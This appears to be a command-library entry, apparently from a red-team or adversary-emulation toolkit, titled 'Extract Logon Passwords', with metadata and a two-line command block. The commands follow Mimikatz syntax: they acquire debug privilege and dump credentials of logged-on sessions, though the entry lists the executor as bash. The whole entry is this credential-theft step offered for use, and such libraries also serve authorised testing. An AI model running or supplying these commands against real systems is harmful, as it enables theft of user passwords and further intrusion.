---
id: 2e837e3a-c7a7-40b0-8b84-63a3d5298690
name: Extract Logon Passwords
type: command
executor: bash
data: 'privilege::debug

  ts::logonpasswords'
output: null
created_at: '2023-04-06T03:56:27.446275+00:00'
updated_at: '2023-04-10T20:37:15.896141+00:00'
---

# Extract Logon Passwords

```bash
privilege::debug
ts::logonpasswords
```
